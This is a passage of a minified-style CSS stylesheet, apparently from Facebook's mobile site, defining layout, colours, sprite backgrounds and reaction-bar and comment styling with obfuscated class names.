            margin-right: auto;
            margin-top: 10px;
            width: 25px
        }

        ._8gqg {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -143px;
            height: 25px;
            margin: 10px;
            width: 25px
        }

        ._8gq5 ._8gqh {
            color: #fff
        }

        ._8ih-._8ih- {
            border-top: none
        }

        ._403j {
            background: #f2f2f2
        }

        ._39pi:hover ._403j {
            background: none
        }

        ._26ii {
            overflow: hidden;
            position: relative
        }

        ._3y24 {
            margin: 8px -13px
        }

        ._8hh9 {
            border-radius: 8px
        }

        html ._26ih._26ih,
        html ._26ih._3x1t,
        html ._3x1t._3x1t {
            display: block;
            position: absolute
        }

        ._26ih:after,
        ._3x1t a:after {
            border: 1px solid rgba(0, 0, 0, .1);
            bottom: 0;
            content: '';
            left: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        ._1r5l {
            background-color: rgba(0, 0, 0, .4);
            bottom: 0;
            color: #fff;
            font-size: 30px;
            font-weight: 400;
            left: 0;
            position: absolute;
            right: 0;
            text-align: center;
            top: 0
        }

        .touch ._-_a {
            margin-left: -15px;
            margin-right: -15px
        }

        ._-_b {
            display: block;
            margin: 0 auto;
            text-align: center
        }

        ._2tw0 {
            margin: 0 auto;
            position: relative
        }

        ._8u2_ {
            position: relative
        }

        ._8u30 {
            align-items: center;
            background-color: rgba(0, 0, 0, .8);
            border-radius: 16px;
            bottom: 8px;
            box-shadow: 0 8px 20px 0 rgba(0, 0, 0, .3), 0 2px 4px 0 rgba(0, 0, 0, .1);
            display: flex;
            height: 32px;
            left: 8px;
            padding: 0 12px;
            pointer-events: none;
            position: absolute;
            z-index: 2
        }

        ._8u31 {
            background-color: transparent;
            padding-right: 7px
        }

        .participant,
        .primaryActor {
            font-weight: 700
        }

        .unread {
            padding-left: 1px;
            border-left: 2px solid #a8b2ce
        }

        .voice .highlight {
            left: 0;
            position: absolute;
            top: -1px
        }

        .touch .voiceTitle {
            display: inline;
            font-size: inherit;
            font-weight: inherit;
            word-wrap: break-word
        }

        .touch .voice {
            padding: 8px;
            position: relative
        }

        .touch .unread {
            border-left-width: 3px;
            padding-left: 2px
        }

        .touch .voice .ib .l {
            margin-right: 8px
        }

        .touch .voice .machineIcon {
            padding-top: 2px;
            text-align: right;
            width: 40px
        }

        .touch .voice .actions {
            margin-top: 4px
        }

        .touch .story .actions {
            margin: 6px 25px 3px 0
        }

        .touch .story.fullwidth .actions {
            margin-top: 0;
            margin-right: 0
        }

        .touch .fullwidth .actions .fcg,
        .touch .fullwidth .actions a.sub {
            color: #bbb
        }

        .touch .story.fullwidth .msg {
            margin-bottom: 12px;
            margin-top: 12px
        }

        .touch .story.fullwidth>.title {
            font-size: 13px;
            line-height: 17px;
            margin-bottom: 12px
        }

        .touch .fullwidth._51s>.title {
            margin-right: 18px
        }

        .touch ._5o96 {
            position: absolute;
            right: 8px;
            top: 8px
        }

        .touch .embedded ._5o96 {
            position: relative;
            right: 0;
            top: 0
        }

        .touch .fullwidth._51s ._51t {
            padding: 17px 21px 15px 14px;
            position: absolute;
            right: -12px;
            top: -3px
        }

        .touch ._58vs._51s._676 {
            position: relative
        }

        .touch .carded.fullwidth._58vs._5o5c {
            border: none
        }

        .touch .carded.fullwidth._58vs._5o5d {
            background: none;
            padding: 0 2px
        }

        .touch .carded.fullwidth._58vs._5o5d._t26 {
            margin-bottom: 0
        }

        .touch .carded.fullwidth._58vs._5o5d._t26._4n6w {
            margin-bottom: 12px
        }

        .touch .carded.fullwidth._58vs._5o5d._t26 .scrollAreaExternalPaginator {
            background: #fff;
            padding-bottom: 9px;
            padding-top: 9px
        }

        .touch .carded.fullwidth._29d0._58vs._5o5d._t26 .scrollAreaExternalPaginator {
            border-radius: 0
        }

        .touch .carded.fullwidth._29d0._58vs._5o5d._t26 .scrollAreaColumn {
            border-radius: 0
        }

        .touch .carded.fullwidth._58vs._5o5d._t26 .scrollAreaPaginatorBubble {
            background: #afb4bd;
            border-radius: 3px 3px 3px 3px;
            height: 6px;
            width: 6px
        }

        .touch._fzu .storyStream>.carded._29d0._5o5d {
            padding-left: 0;
            padding-right: 0
        }

        .touch._fzu .storyStream>.carded._29d0._5o5d .scrollArea {
            margin-left: 0
        }

        .touch .carded.fullwidth._58vs._5o5d._t26 .scrollAreaPaginatorBubble.scrollAreaPaginatorBubbleActive {
            background-color: #3d4452
        }

        .touch .fullwidth._51s._676 ._51t {
            top: 24px
        }

        .touch.android.x2 .fullwidth._51s ._51t {
            right: -1px;
            top: -1px
        }

        .touch .fullwidth._51s._676._58vs ._51t {
            top: -8px
        }

        .touch div.fullwidthMore {
            background: #dadde1
        }

        .touch .fullwidthMore .content {
            height: 30px;
            padding-left: 10px
        }

        .fullwidthMore.item a.primary.touched .content *,
        .touch .fullwidthMore .content .fcl {
            color: #576b95
        }

        .fullwidthMore.item a.primary.touched .primarywrap {
            background-color: #d2d4df;
            border-color: #b1b4bd;
            color: #576b95
        }

        .touch .story .flyoutList {
            bottom: 4px;
            top: auto
        }

        ._24e1 {
            background-color: #e8eaee;
            color: #1c2028;
            display: flex;
            position: relative
        }

        ._4jhr {
            background-color: #000;
            color: #7f7f7f
        }

        ._32l5 {
            box-sizing: border-box;
            min-height: 60px;
            overflow: hidden;
            padding: 12px
        }

        ._2ms0 {
            overflow: hidden;
            word-wrap: break-word
        }

        ._24e4 {
            max-height: 56px;
            overflow: hidden;
            word-wrap: break-word
        }

        ._2xbh {
            max-height: 54px
        }

        ._6yhs {
            max-height: 58px
        }

        ._4qxs {
            position: relative;
            z-index: 3
        }

        ._4qxt {
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: 2
        }

        ._38wn {
            z-index: 5
        }

        ._38wo {
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: 4
        }

        ._7gfs {
            background-color: #fff;
            z-index: 3
        }

        ._2rbw,
        .touch ._2rbw ._41nw {
            color: #464950;
            font-size: 12px;
            line-height: 16px
        }

        ._2q5e {
            color: #666
        }

        ._41nw {
            color: inherit;
            display: block
        }

        ._2608 {
            display: flex
        }

        ._o6t {
            margin: 2px 4px 0 0
        }

        ._o6v {
            margin: 4px 4px 0 0
        }

        ._1i5f._42nf {
            background-image: url(/rsrc.php/v3/yN/r/htxyXgNVeN5.png)
        }

        .x1-5 ._1i5f._42nf {
            background-image: url(/rsrc.php/v3/yp/r/_sWEGokY3En.png)
        }

        .x2 ._1i5f._42nf {
            background-image: url(/rsrc.php/v3/yX/r/xUYcwHEFdUO.png)
        }

        ._1i5f._42nf ._42ng {
            background-image: url(/rsrc.php/v3/yU/r/KeydAvho4wu.png)
        }

        .x1-5 ._1i5f._42nf ._42ng {
            background-image: url(/rsrc.php/v3/yy/r/4a0zJ0ad-7B.png)
        }

        .x2 ._1i5f._42nf ._42ng {
            background-image: url(/rsrc.php/v3/yr/r/23PXcErMHtT.png)
        }

        ._1i5e._42nf,
        .x1-5 ._1i5e._42nf,
        .x2 ._1i5e._42nf,
        ._1i5e._42nf ._42ng,
        .x1-5 ._1i5e._42nf ._42ng,
        .x2 ._1i5e._42nf ._42ng {
            background-repeat: repeat-x;
            background-size: 16px 16px;
            height: 16px
        }

        ._1i5e._42nf,
        .x1-5 ._1i5e._42nf,
        .x2 ._1i5e._42nf {
            width: 79px
        }

        ._17pf {
            -webkit-appearance: none;
            background: none;
            border: 1px solid #fff;
            border-radius: 4px;
            font-size: 12px;
            line-height: 16px;
            margin: 0;
            overflow: hidden;
            padding: 3px 8px;
            text-align: center;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        ._17pf,
        .touch ._17pf {
            background-color: transparent;
            color: #fff
        }

        ._17pf._4x8w,
        .touch ._17pf._4x8w {
            border: 1px solid #444950;
            color: #444950
        }

        ._lbx {
            text-transform: uppercase
        }

        ._2zi_ {
            position: relative
        }

        ._5zgx {
            color: #464950;
            font-size: 12px;
            height: 16px;
            line-height: 16px
        }

        ._65cz {
            color: #666
        }

        ._2rea {
            flex-direction: column
        }

        ._2rec {
            align-items: center;
            display: flex;
            flex-direction: row;
            justify-content: space-between
        }

        ._6yhv {
            padding: 10px 12px
        }

        ._3jdg {
            flex: 1 1 auto
        }

        ._3jdh {
            flex: 0 0 auto;
            margin-left: 12px
        }

        ._4act {
            font-size: 16px;
            line-height: 20px;
            overflow: hidden
        }

        ._16-5 {
            font-size: 14px;
            line-height: 18px
        }

        ._zgm {
            z-index: 6
        }

        ._213o {
            display: block
        }

        ._vyy {
            position: relative
        }

        ._k9b {
            cursor: default
        }

        ._96hu {
            margin: 10px;
            text-align: center
        }

        ._412_ {
            margin-left: -10px;
            margin-right: -10px
        }

        ._412_::after {
            border-bottom: 1px solid rgba(0, 0, 0, .1);
            border-top: 1px solid rgba(0, 0, 0, .1);
            bottom: 0;
            content: '';
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: 1
        }

        ._bpa._412_::after {
            border-bottom: 1px solid rgba(0, 0, 0, .08);
            border-top: 1px solid rgba(0, 0, 0, .08)
        }

        ._4b43._412_::after {
            border-left: 1px solid rgba(0, 0, 0, .1);
            border-right: 1px solid rgba(0, 0, 0, .1)
        }

        ._21nd ._412_ ._2zi_,
        ._21nd ._412_ ._32l5 {
            overflow: hidden
        }

        ._21nd ._412_ ._2zj0,
        ._21nd ._412_ ._2rec:first-child {
            border-top-left-radius: 3px;
            border-top-right-radius: 3px
        }

        ._21nd ._412_ ._2zj6 {
            border-top-left-radius: 3px
        }

        ._21nd ._412_ ._2wf4 {
            border-top-right-radius: 3px
        }

        ._21nd._27x0 ._412_ ._2zj6 {
            border-bottom-left-radius: 3px
        }

        ._21nd ._5t8z._412_ {
            margin: 0
        }

        ._21nd ._5t8z._412_::after {
            border: 0
        }

        ._52h1 {
            margin-right: 3px;
            vertical-align: -2px
        }

        ._2w79 {
            -webkit-box-orient: vertical;
            display: -webkit-box;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: normal
        }

        ._2ip_ {
            color: #90949c
        }

        ._2ip_>div {
            position: relative
        }

        ._2ip_ ._2zh4::before,
        ._2ip_ ._15kk::before,
        ._2ip_ ._15kk+._4u3j::before {
            background: #dadde1;
            content: '';
            display: block;
            height: 1px;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: 0
        }

        ._2ip_ ._xqz::before {
            top: unset
        }

        ._4b44 ._15kk._8gq4 {
            color: #fff
        }

        ._4b44 ._15kk {
            color: #616770
        }

        ._4b44._2ip_ ._2zh4::before,
        ._4b44._2ip_ ._15kk::before,
        ._4b44._2ip_ ._15kk+._4u3j::before {
            background-color: #ced0d4
        }

        ._4b44._2ip_ ._2zh4::before,
        ._4b44._2ip_ ._15kk::before {
            margin: 0 10px
        }

        .ios.x2 ._2ip_>div::before,
        .android.x2 ._2ip_>div::before {
            transform: scaleY(.5);
            transform-origin: 0 0
        }

        ._15kj {
            color: #9197a3;
            font-weight: 400
        }

        ._34qc {
            margin: 10px
        }

        ._3myz._3myz {
            margin-bottom: 6px;
            margin-top: 6px
        }

        ._2gw-._2gw-._2gw- {
            margin-bottom: 0;
            margin-top: 0
        }

        ._2gw-._2gw-._2gw-._15kj,
        ._2gw-._2gw-._2gw- ._15kj {
            margin-bottom: 3px;
            margin-top: 3px
        }

        ._4b45._3myz {
            font-size: 14px;
            margin-bottom: 9px;
            margin-top: 10px
        }

        ._7e9a ._4b45._3myz {
            margin: 12px
        }

        ._15kl {
            position: relative
        }

        ._15kl._15kl ._77li,
        ._15kj._15kj a {
            color: inherit;
            font-weight: inherit
        }

        ._15kl._15kl ._77li {
            display: inline-block;
            width: 100%
        }

        ._3hwk._15kl ._77li {
            margin: -6px -8px -8px;
            padding: 6px 8px 8px
        }

        ._7e9a ._3hwk._15kl ._77li {
            margin: 0;
            padding: 4px
        }

        ._3hwk._15kl ._77li._77ld {
            margin: -19px -8px
        }

        ._4u3j {
            background: #f3f3f3;
            color: #5e5e5e;
            padding: 12px
        }

        ._15km ._15kl ._77li::before {
            content: '';
            display: inline-block;
            height: 32px;
            margin-bottom: 1px;
            margin-right: 4px;
            vertical-align: middle;
            width: 16px
        }

        ._4b46._15km ._15kl ._77li::before {
            width: 20px
        }

        ._15km ._15ko::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -83px -77px
        }

        ._4b46._15km ._15ko::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -63px -189px;
            height: 20px;
            width: 20px
        }

        ._4b46._15km ._8gq4._15ko::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -96px -143px
        }

        ._15km ._15ko._77la::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -100px -77px
        }

        ._4b46._15km ._15ko._77la::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -21px -189px;
            height: 20px;
            width: 20px
        }

        ._15km ._15kq::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -66px -77px
        }

        ._4b46._15km ._15ko::before,
        ._4b46._15km ._15ko._77la::before,
        ._4b46._15km ._15kr::before,
        ._4b46._15km ._15kq::before {
            left: -2px;
            position: relative
        }

        ._4b46._15km ._15kq::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -42px -189px;
            height: 20px;
            width: 20px
        }

        ._4b46._15km ._8gq4._15kq::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -75px -143px
        }

        ._4b46._15km ._8gq4._15kr::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -168px
        }

        ._15km ._15kr::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -110px
        }

        ._4b46._15km ._15kr::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -84px -189px;
            height: 20px;
            width: 20px
        }

        ._2zh4,
        ._15ks {
            background: #f3f3f3;
            color: #5e5e5e;
            font-size: 12px;
            line-height: 36px
        }

        ._15ks._4b47 {
            background: none
        }

        ._15ks._4b47._xr1 {
            line-height: 30px
        }

        ._15ks+._4u3j {
            padding: 10px
        }

        ._15ks+._4u3j._29-5 {
            padding: 8px
        }

        ._15ks+._4u3j._hdn {
            padding: 5px 0
        }

        ._2ip_ ._15ks+._4u3j::before {
            left: 10px;
            right: 10px
        }

        ._4b44._2ip_ ._15ks+._4u3j::before {
            left: 0;
            right: 0
        }

        ._15ks ._77la._77la {
            color: #5890ff
        }

        ._15ks ._15kl._15kl {
            line-height: inherit;
            padding: 0 8px
        }

        ._868x {
            font-size: 14px;
            line-height: 16px;
            padding-top: 8px
        }

        ._868y {
            padding-bottom: 2px;
            padding-top: 2px
        }

        ._868z {
            margin-bottom: 4px;
            padding-top: 2px
        }

        ._15ks ._15kl::before {
            border-left: 1px solid #d6d8db;
            bottom: 7px;
            content: '';
            left: 0;
            position: absolute;
            top: 7px
        }

        ._4b47._15ks ._15kl::before {
            border: none
        }

        ._15ks ._15kl:first-child::before {
            display: none
        }

        ._15ks:last-child,
        ._15ks+._4u3j {
            border-radius: 0 0 4px 4px
        }

        ._5gh8 ._15ks:last-child,
        ._5gh8 ._15ks+._4u3j {
            border-radius: 0
        }

        ._15ko._-g {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -42px -168px;
            display: inline-block;
            height: 20px;
            position: relative;
            text-indent: -5000px;
            width: 20px
        }

        ._15ko._77la._-g {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -21px -168px
        }

        ._1e6 {
            overflow: hidden
        }

        ._2eo-._4b44 {
            color: #616770
        }

        ._8gq5 ._2eo-._4b44 {
            color: #fff
        }

        ._2ep2 {
            left: 3px;
            position: absolute;
            top: 3px
        }

        ._1e6 ._2ep2 {
            left: 0
        }

        ._77ld {
            text-overflow: ellipsis;
            white-space: nowrap
        }

        ._15km ._77li._77ld::before {
            content: none;
            display: none
        }

        ._4h-b._4h-b {
            display: inline-block;
            margin-bottom: 2px;
            margin-right: 5px;
            vertical-align: middle
        }

        ._58nj {
            background: #fff;
            color: #444950
        }

        ._2ip_ ._58nj::before,
        ._2ip_ ._5ohp::before {
            left: 10px;
            right: 10px
        }

        ._2ip_ ._58nj+._4u3j::before,
        ._2ip_ ._5ohp+._4u3j::before {
            left: 0;
            right: 0
        }

        ._58nj ._15kl::before,
        ._5ohp ._15kl::before {
            content: none
        }

        ._58nj ._15kl ._77li::before,
        ._5ohp ._15kl ._77li::before {
            height: 16px
        }

        ._58nj ._15ko::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -21px -210px
        }

        ._58nj ._15ko._77la::before,
        ._5ohp ._15ko._77la::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -105px -187px
        }

        ._58nj ._15kq::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -35px -60px
        }

        ._58nj ._15kr::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -55px -210px
        }

        ._58nj ._15kq::before,
        ._58nj ._15kr::before,
        ._5ohp ._15kq::before,
        ._5ohp ._15kr::before {
            position: relative;
            top: -1px
        }

        ._5ohp {
            background: transparent;
            color: #fff
        }

        ._5ohp ._15ko::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -38px -210px
        }

        ._5ohp ._15kq::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -52px -60px
        }

        ._5ohp ._15kr::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -72px -210px
        }

        ._5qux._5qux {
            font-size: 12px;
            margin: 6px 10px
        }

        ._1ekf {
            clip: rect(1px, 1px, 1px, 1px);
            height: 1px;
            overflow: hidden;
            position: absolute;
            width: 1px
        }

        ._4m0z {
            background-color: #fff
        }

        ._55m {
            color: #666;
            font-family: 'HelveticaNeue-Medium', 'Helvetica Neue Medium', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 12px;
            margin-bottom: 23px;
            margin-top: 9px
        }

        ._55n {
            background-color: #000;
            line-height: 0
        }

        ._2ip_ ._55n::before {
            height: 0
        }

        ._15ks ._55p {
            color: #7f7f7f
        }

        ._15ks ._55p::before {
            border-left: 0
        }

        ._8l2l {
            display: flex
        }

        ._8l2b {
            flex-grow: 1;
            text-align: right;
            white-space: nowrap
        }

        ._1-kb {
            transform: translate3d(0, 0, 0)
        }

        ._1-kb ._5c0e {
            display: none
        }

        ._1-kb ._5bo2,
        ._1-kb ._5bo1 {
            overflow: visible
        }

        ._1-kb ._5bo2 {
            padding-top: 90px
        }

        ._1-kb ._5bo1 {
            padding-bottom: 48px
        }

        ._5xt_ ._5bo0 {
            left: 10%;
            width: 80%
        }

        ._5xt_ ._5bo2 {
            bottom: 16px
        }

        ._31rl ._5bo2 {
            bottom: 12px
        }

        ._5xt_ ._5bo2 ._5xu0 {
            bottom: 16px
        }

        ._5xt_ ._5bo2 ._5xu1 {
            bottom: -16px
        }

        ._1-kc {
            background: #fff;
            box-shadow: 0 0 0 1px rgba(0, 0, 0, .05), 0 1px 2px rgba(0, 0, 0, .15);
            margin: 0 auto;
            max-width: 95%;
            padding-left: 5px
        }

        ._uah,
        ._1-kc._1-kc._1-kc {
            border-radius: 50px
        }

        ._1gc9 {
            background-color: #000;
            border-radius: 20px;
            color: #fff;
            display: none;
            font-size: 16px;
            font-weight: 700;
            left: 50%;
            line-height: 36px;
            padding: 0 8px;
            position: absolute;
            top: -40px;
            transform: translateX(-50%);
            white-space: nowrap
        }

        ._1-kd {
            flex: 1;
            margin: 5px 5px 5px 0;
            position: relative
        }

        ._1-kd:focus {
            outline: 0
        }

        ._1-kd[data-active] ._1gc9 {
            display: block
        }

        ._1-kb ._5bo0[data-longpress] ._1-kc ._1-kd[data-active] {
            flex: 2;
            margin: -13% 5px 5px 0;
            padding: 5px 0
        }

        ._1-kb ._5bo0[data-longpress] ._1-kd {
            margin-bottom: -95px;
            margin-top: -95px
        }

        ._1-kb ._5bo0[data-longpress] {
            margin-bottom: -100px;
            margin-top: -100px
        }

        ._1-kb ._5bo0[data-longpress],
        ._1-kb ._5bo0[data-longpress] ._1-kd {
            padding-bottom: 100px;
            padding-top: 100px
        }

        ._403n {
            background: #f5f6f7;
            height: 100%;
            position: absolute;
            width: 100%;
            z-index: 2
        }

        ._2a_g ._403n,
        ._70na ._403n {
            background-color: #fff;
            box-sizing: border-box;
            left: 0;
            padding: 3px 0 3px 12px;
            top: 0;
            white-space: nowrap
        }

        ._70ol {
            -webkit-touch-callout: none;
            -webkit-user-select: none
        }

        ._403n._31ru {
            z-index: 3
        }

        ._403o {
            box-sizing: border-box;
            display: table;
            padding: 0 10px;
            width: 100%
        }

        ._403p {
            color: #a9a9a9;
            display: table-cell
        }

        ._403p::before {
            content: '\b7'
        }

        ._403p,
        ._5xu2 {
            color: #90949c;
            text-align: center
        }

        ._31ru ._5xu2 {
            text-align: left
        }

        ._5bo1 ._1-kc ._1-kd,
        ._5bo1 ._1-kc {
            transform: scaleY(-1)
        }

        ._mpx._4sue {
            image-rendering: -webkit-optimize-contrast;
            image-rendering: crisp-edges
        }

        ._1-kd[data-active] ._uah {
            left: 0;
            position: absolute;
            right: 0
        }

        ._3hxn {
            font-size: 12px;
            line-height: 16px
        }

        ._rnk {
            color: #90949c
        }

        ._6hyv {
            bottom: 0;
            left: 0;
            margin: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        ._1fnt {
            float: right
        }

        ._1j-c {
            display: inline-block;
            margin-left: 10px;
            vertical-align: middle
        }

        ._6hyu {
            color: #606770;
            position: relative;
            z-index: 1
        }

        ._5ton {
            isolation: isolate;
            line-height: 16px;
            padding: 8px
        }

        ._1_gl {
            font-weight: 700;
            height: 16px;
            padding: 8px
        }

        ._8bn8 {
            text-align: end
        }

        ._1w1k {
            display: inline-block
        }

        ._qfz {
            display: inline-block;
            line-height: 17px;
            vertical-align: middle
        }

        ._1g05 {
            display: inline-block;
            position: relative
        }

        ._1g06 {
            display: inline;
            margin-left: 4px;
            vertical-align: middle
        }

        ._8l2a {
            flex-shrink: 1;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        ._1g05 {
            background-color: #fff;
            border-radius: 10px;
            margin-left: -2px;
            padding-right: 2px;
            padding-top: 1px
        }

        ._8gq6 ._1g05 {
            background-color: rgba(0, 0, 0, .5)
        }

        ._1g05:first-child {
            margin-left: 0
        }

        ._5c4t ._1g05 {
            background: #f5f6f7
        }

        ._5c4t ._1g06 {
            color: #000
        }

        ._28wy+._28wy::before,
        ._28-d+._28wy::before {
            content: '\a0\b7\a0'
        }

        ._28-d:empty+._28wy::before,
        ._28wy:empty+._28wy::before,
        ._2og4 .like_opt+._28wy::before {
            content: none;
            display: none
        }

        ._28wy {
            display: inline-block
        }

        ._2og4>*>._28-d {
            display: inline
        }

        .abt {
            border-top: 1px solid
        }

        .abb {
            border-bottom: 1px solid
        }

        .acw {
            border-color: #e9e9e9
        }

        .acb {
            border-color: #1d4088
        }

        .aclb {
            border-color: #d8dfea
        }

        .acg {
            border-color: #ccc
        }

        .acy {
            border-color: #e2c822
        }

        .acr {
            border-color: #dd3c10
        }

        .async_saving_show {
            display: none
        }

        .async_elem_saving .async_saving_show {
            display: inline
        }

        .async_elem_saving .async_saving_hide {
            display: none
        }

        .async_saving_visible {
            visibility: hidden
        }

        .async_elem_saving .async_saving_visible {
            visibility: visible
        }

        .async_throbber {
            margin: 0 6px
        }

        .text_exposed .text_exposed_show {
            display: inline
        }

        .text_exposed_show,
        .text_exposed .text_exposed_hide {
            display: none
        }

        .touched_hide,
        .touched .touched_show {
            clip: auto;
            display: block;
            position: static
        }

        .touched_show,
        .touched .touched_hide {
            clip: rect(0, 0, 0, 0);
            position: absolute
        }

        .touch ._4s19 {
            display: inline-block;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
        }

        .touch ._4s19 .img {
            display: block
        }

        ._5d93 ._56br._4_m5 {
            vertical-align: text-top
        }

        ._4_m7 {
            border-radius: 0 0 3px 3px;
            color: #fff;
            font-size: 12px
        }

        .ios ._4_m7 {
            border-radius: 0 0 2px 2px
        }

        ._4_m7 .img {
            margin-right: 8px
        }

        .async_like .btn.like_opt,
        .async_like .like_opt,
        .async_cmt_like .cmt_like_opt {
            display: none
        }

        .flLinkish {
            color: #3b5998;
            font-weight: 700
        }

        form {
            margin: 0;
            border: 0
        }

        ._9qk_ {
            -webkit-appearance: none;
            border: solid 1px gray;
            border-color: #ccd0d5;
            border-radius: 6px;
            box-sizing: border-box;
            height: 38px;
            margin-bottom: 4px;
            padding: 4px 12px 5px;
            width: 100%
        }

        ._5whq {
            border: solid 1px #999;
            border-top-color: #888;
            margin: 0
        }

        .touch ._5whq {
            -webkit-appearance: none;
            border-radius: 0;
            box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
            box-sizing: border-box;
            padding: 4px 7px 5px
        }

        .touch textarea._5whq {
            padding: 4px 5px 5px
        }

        .touch ._5whr ._5whq {
            background-color: transparent;
            border: 0;
            box-shadow: none;
            width: 100%
        }

        .android ._5whq {
            box-shadow: inset 0 2px 1px -1px rgba(0, 0, 0, .15);
            padding-top: 5px
        }

        .android ._5whq[type='search']::-webkit-search-decoration {
            display: none
        }

        .android ._5whq[type='search']::-webkit-search-cancel-button {
            display: none
        }

        .android ._5whq[type='search']::-webkit-search-results-button {
            display: none
        }

        .android ._5whq[type='search']::-webkit-search-results-decoration {
            display: none
        }

        .clear {
            clear: both
        }

        .touch .ib {
            display: flex;
            flex: 1
        }

        .touch.ff .ib {
            align-items: flex-start;
            width: 100%
        }

        .touch.ff .ib.cc {
            align-items: center
        }

        .touch .ib .c {
            flex: 1;
            min-width: 0
        }

        .touch .ib.cc .c,
        .touch .ib.cc .ext {
            flex-direction: column;
            justify-content: center;
            display: flex
        }

        .ib .l {
            display: inline-block;
            margin-right: 4px
        }

        .ib .ext {
            margin-left: 4px
        }

        .lr {
            width: 100%
        }

        .lr .r {
            text-align: right
        }

        .touch .lr {
            position: relative
        }

        .touch .lr .r {
            float: right
        }

        .nowrap {
            white-space: nowrap
        }

        .nowrap.collapse {
            text-overflow: ellipsis;
            overflow: hidden
        }

        ._4s0y {
            height: 0;
            width: 100%
        }

        ._50xr {
            overflow: hidden;
            position: relative
        }

        ._50xr .img {
            height: 100%;
            min-height: 100%;
            position: relative
        }

        ._50xr ._5sgi {
            height: auto;
            width: 100%
        }

        ._50xr ._5sgj {
            min-height: 0;
            vertical-align: middle
        }

        ._50xr._4g6 .img {
            height: auto;
            min-height: 0
        }

        ._8oat {
            display: inline-block;
            position: relative;
            vertical-align: bottom
        }

        ._8oau {
            border-radius: 200px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, .1);
            display: block;
            margin-top: -50%;
            padding: 5px
        }

        ._8oaa {
            background-color: #1c1e21
        }

        ._4prr {
            display: block;
            position: relative
        }

        ._4prr::after {
            border: 1px solid rgba(0, 0, 0, .1);
            box-sizing: border-box;
            content: '';
            display: block;
            height: 100%;
            left: 0;
            position: absolute;
            top: 0;
            width: 100%
        }

        .x2 ._4prr::after {
            height: 200%;
            transform: scale(.5);
            transform-origin: 0 0;
            width: 200%
        }

        .rtl.x2 ._4prr::after {
            transform-origin: 100% 0
        }

        .android.x2 ._4prr:active::after,
        .android.x2 ._4prr:focus::after {
            height: 100%;
            transform: scale(1);
            width: 100%
        }

        ._3bhd::after,
        ._3bhd>i,
        img._3bhd,
        i._3bhd {
            border-radius: 50%
        }

        .img.feedAudienceIcon,
        .feedAudienceIcon {
            left: 1px;
            position: relative;
            top: 1px;
            vertical-align: baseline
        }

        .audienceWidgetIcon .img.feedAudienceIcon,
        .feedAudienceIcon {
            position: relative;
            top: .4px;
            vertical-align: baseline
        }

        .story .feedAudienceIcon {
            margin-left: 5px
        }

        ._597g .img {
            margin-right: 6px;
            vertical-align: baseline
        }

        ._597g {
            padding: 8px
        }

        .touch ._597g {
            padding: 30px
        }

        .scrollArea {
            overflow: hidden;
            position: relative
        }

        .scrollArea.fullBleed {
            overflow: visible
        }

        .scrollArea.degraded {
            overflow: visible
        }

        .scrollArea.degraded .scrollAreaBody {
            transform: none;
            transition: none;
            width: 110%
        }

        .scrollArea .scrollAreaBody {
            position: relative;
            z-index: 5
